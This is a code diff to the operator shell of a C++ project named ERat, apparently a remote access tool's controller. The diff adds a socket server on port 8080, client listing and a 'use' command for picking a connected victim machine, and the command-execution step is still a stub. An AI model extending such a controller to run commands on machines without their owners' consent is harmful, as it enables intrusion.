@@ -6,7 +6,7 @@
 
 namespace ERat
 {
-	Shell::Shell()
+	Shell::Shell() : _server(8080)
 	{
 
 	}
@@ -15,6 +15,8 @@ namespace ERat
 	{
 		_map.insert(std::make_pair("cmd", std::bind(&ERat::Shell::executeCommand, this, std::placeholders::_1)));
 		_map.insert(std::make_pair("list", std::bind(&ERat::Shell::listClients, this, std::placeholders::_1)));
+		_map.insert(std::make_pair("use", std::bind(&ERat::Shell::useClient, this, std::placeholders::_1)));
+		_serverThread = std::make_unique<std::thread>(&SocketServer::run, &_server);
 		return true;
 	}
 
@@ -32,7 +34,12 @@ namespace ERat
 			else if (!line.empty()) {
 				std::cout << "Command not found." << std::endl;
 			}
-			std::cout << "> ";
+			if (_usedClient) {
+				std::cout << "[" << _usedClient->getIp() << "]> ";
+			}
+			else {
+				std::cout << "> ";
+			}
 		}
 	}
 
@@ -48,6 +55,10 @@ namespace ERat
 			std::cout << "Missing command args" << std::endl;
 		}
 		else {
+			if (!_usedClient) {
+				std::cout << "You must first select a client (list)" << std::endl;
+				return false;
+			}
 			std::cout << "Calling execute command with: " << commandLine << std::endl;
 		}
 		return true;
@@ -56,9 +67,42 @@ namespace ERat
 	bool	Shell::listClients(std::list<cpp::String> const&)
 	{
 		std::cout << "Connected clients list:" << std::endl;
+		auto clients = _server.getClients();
+		auto it = clients.begin();
+		int i = 0;
+
+		while (it != clients.end()) {
+			std::cout << "#" << i << ": " << (*it)->getIp() << std::endl;
+			++it;
+			++i;
+		}
 		return true;
 	}
 
-	Shell::~Shell() = default;
+	bool	Shell::useClient(std::list<cpp::String> const& args)
+	{
+		auto	it = args.begin();
+
+		_usedClient.reset();
+		++it;
+		if (it != args.end()) {
+			auto i = std::atoi((*it).c_str());
+
+			if (i < _server.getClients().size()) {
+				_usedClient = _server.getClients()[i];
+				std::cout << "Use client: " << _usedClient->getIp() << std::endl;
+			}
+		}
+		else {
+			std::cout << "Missing socket number" << std::endl;
+			return false;
+		}
+		return true;
+	}
+
+	Shell::~Shell() {
+		_server.close();
+		_serverThread->join();
+	}
 }
 
